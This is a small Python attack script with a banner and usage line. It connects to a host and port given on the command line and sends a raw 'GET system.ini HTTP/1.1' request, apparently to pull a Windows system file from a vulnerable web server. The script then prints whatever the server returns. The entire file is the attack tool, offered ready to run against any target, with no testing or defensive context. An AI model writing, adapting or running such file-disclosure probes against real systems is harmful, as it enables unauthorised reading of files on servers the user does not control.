#!/usr/bin/python3

#import os
import socket
import re
import sys


banner = """

::::,   :::::,  :::: ::   :: :::::: :::::,
::   ;  ::   ;   ::  ::   :: ::     ::   ;
::::'   :::::'   ::  ::   :: :::::: :::::'
::      :: ::    ::   :   :  ::     :: ::
::      ::  ',  ::::   ...   :::::: ::  ',

"""

usage = f"""

{sys.argv[0]} <host_name> <port>

"""


print(banner)

if len(sys.argv) != 3:
    
    print("[!]Need More Arguments")
    print(usage)
    sys.exit()

target_host = sys.argv[1]
target_port = sys.argv[2]

reg = re.search(r"http://|https://",target_host)

if reg != None:
    print("[!]Don't Need Protocol like a \"http://...\"")
    print("[-]Fix the Forms")
    
    value = len(reg.group())

    target_host = target_host[value:]

try:

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((target_host,int(target_port)))

    payload = b"GET system.ini HTTP/1.1\n\n"

    s.send(payload)
    res = s.recv(1024)
    print(res.decode())
    print(res)
except:

    print("[!]Some Issue Occured")
    sys.exit()



